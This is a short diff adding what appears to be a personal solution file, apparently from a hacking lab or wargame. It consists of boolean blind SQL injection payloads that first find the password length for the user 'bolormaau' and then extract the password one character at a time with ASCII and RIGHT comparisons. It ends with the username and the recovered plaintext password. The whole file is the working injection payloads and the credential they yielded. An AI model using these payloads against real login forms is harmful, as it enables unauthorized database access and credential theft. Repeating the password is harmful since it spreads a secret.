@@ -1,0 +1,18 @@
+
+') or username='bolormaau' and LENGTH(password)=11 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,1))=98 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,2))=121 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,3))=109 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,4))=54 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,5))=122 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,6))=80 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,7))=99 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,8))=85 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,9))=90 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,10))=42 or ('0'='1
+') or username='bolormaau' and ASCII(RIGHT(password,11))=72 or ('0'='1
+
+user name: bolormaau
+password: H*ZUcPz6myb
+
+
